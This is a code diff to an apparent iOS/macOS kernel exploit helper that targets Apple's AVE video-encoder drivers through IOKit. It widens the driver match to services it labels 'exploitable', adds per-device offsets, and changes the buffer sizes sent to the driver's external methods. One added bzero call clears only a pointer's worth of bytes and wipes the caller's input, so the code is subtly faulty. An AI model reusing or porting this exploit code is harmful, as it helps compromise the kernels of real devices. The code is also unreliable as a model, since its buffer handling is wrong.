@@ -43,14 +43,18 @@ kern_return_t apple_ave_utils_get_connection(io_connect_t * conn_out) {
         
 		ret = IORegistryEntryGetName(service, service_name);
         
+        // Uncomment to list all the services/drivers
+        //printf("[INFO]: Service: %s\n", service_name);
+        
         if (KERN_SUCCESS != ret) {
             printf("[ERROR]: Error retrieving name\n");
             continue;
         }
         
         // Name differs, and so we check
-		if (strstr(service_name, "AppleAVE2Driver") || strstr(service_name, "AppleVXE380Driver")) {
+		if (strstr(service_name, "AppleAVE2Driver") || strstr(service_name, "AppleVXE380Driver")|| strstr(service_name, "AppleAVEDriver")) {
             printf("[INFO]: Found matching exploitable service: %s\n", service_name);
+            set_driver_offsets(service_name);
         } else {
             continue;
         }
@@ -171,14 +175,14 @@ kern_return_t apple_ave_utils_encode_frame(io_connect_t conn, void * input_buffe
 kern_return_t apple_ave_utils_prepare_to_encode_frames(io_connect_t conn, void * input_buffer, void * output_buffer) {
 	
 	kern_return_t ret = KERN_ABORTED;
-	size_t output_buffer_size = ENCODE_FRAME_OUTPUT_BUFFER_SIZE;
+	size_t output_buffer_size = OFFSET(encode_frame_output_buffer_size);
     
     printf("[INFO]: apple_ave_utils_prepare_to_encode_frames preparing to encode frames for connection\n");
-    
+    sleep(4);
     ret = IOConnectCallMethod(conn,
         APPLEAVE2_EXTERNAL_METHOD_PREPARE_TO_ENCODE_FRAMES,
         NULL, 0, input_buffer,
-        ENCODE_FRAME_INPUT_BUFFER_SIZE,
+        OFFSET(encode_frame_input_buffer_size),
         NULL, 0,
         output_buffer, &output_buffer_size);
     
@@ -199,14 +203,17 @@ kern_return_t apple_ave_utils_prepare_to_encode_frames(io_connect_t conn, void *
 kern_return_t apple_ave_utils_set_session_settings(io_connect_t conn, void * input_buffer, void * output_buffer) {
 	
 	kern_return_t ret = KERN_SUCCESS;
-	char output_buffer_local[ENCODE_FRAME_OUTPUT_BUFFER_SIZE] = {0};
+    char output_buffer_local[OFFSET(encode_frame_output_buffer_size)];
+
+    bzero(input_buffer, sizeof(input_buffer));
+
 	size_t output_buffer_size = sizeof(output_buffer_local);
 
 
 	ret = IOConnectCallMethod(conn,
 		APPLEAVE2_EXTERNAL_METHOD_SET_SESSION_SETTINGS,
 		NULL, 0,
-		input_buffer, ENCODE_FRAME_INPUT_BUFFER_SIZE,
+		input_buffer, OFFSET(encode_frame_input_buffer_size),
 		NULL, 0,
 		output_buffer_local, &output_buffer_size);
 
